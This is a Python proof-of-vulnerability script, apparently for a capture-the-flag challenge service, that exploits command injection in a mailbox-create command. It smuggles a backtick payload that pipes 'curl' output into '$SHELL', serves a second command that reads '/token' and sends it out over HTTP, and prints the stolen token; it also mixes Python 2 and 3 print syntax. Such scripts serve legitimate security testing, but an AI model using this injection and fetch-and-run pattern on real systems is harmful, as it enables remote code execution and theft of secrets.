import sys
import os
import random
import socket
import string
import time
import struct
import signal

def handler(signum, frame):
    print('[FAIL] Timeout signal raised. PoV likely failed')
    sys.exit(0)

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('[FAIL] Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def readuntil( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z


def sw(fd, line):
    fd.send(line.encode('utf-8'))

def randomstring(l):
    q = ''

    for _ in range(l):
        q += random.choice(string.ascii_lowercase)

    return q

def listener( port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind(('', port))
    except:
        print '[FAIL] bind to {0} failed'.format(port)
        sys.exit()

    s.listen(2)

    return s

def run_pov( HOST, PORT ):

    s = connect( HOST, PORT)

    ## Login
    sw(s, 'a login chess chess\n')
    y = readuntil(s, '\r\n')

    http = listener(8000)
    final = listener(8080)

    sw(s, "a create inbox.hello`curl -L localhost:8000 | $SHELL`world\n")

    command = "curl -L localhost:8080/`cat /token`\n"

    resp = "HTTP/1.0 200 OK\r\nServer: None\r\nContent-type: text/html\r\nContent-Length: " + str(len(command) )
    resp += "\r\n\r\n"
    resp += command

    conn, addr = http.accept()

    print('[INFO] The command injection worked. Sending additional bash command')

    print readuntil(conn, '\r\n\r\n')
    conn.send(resp)
    conn.close()

    conn, addr = final.accept()

    print('[INFO] The follow on command worked. Getting token now')
    resp = readuntil(conn, '\r\n\r\n')
    conn.close()

    resp = resp.split(' ')

    tok = resp[1][1:]
    print('[TOKEN] ' + tok)

    sys.exit()

def main():

    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    if 'SEED' in os.environ:
        SEED = int(os.environ['SEED'])
    else:
        SEED = random.randint(0, 2**64 - 1)

    print('[INFO] Poller for the Smith Challenge Binary')
    print('[INFO] SEED: {0}'.format(SEED))

    random.seed( SEED )

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(5)

    run_pov(HOST, PORT)
    print('[FAILED] POV failed')

if __name__ == '__main__':
    main()
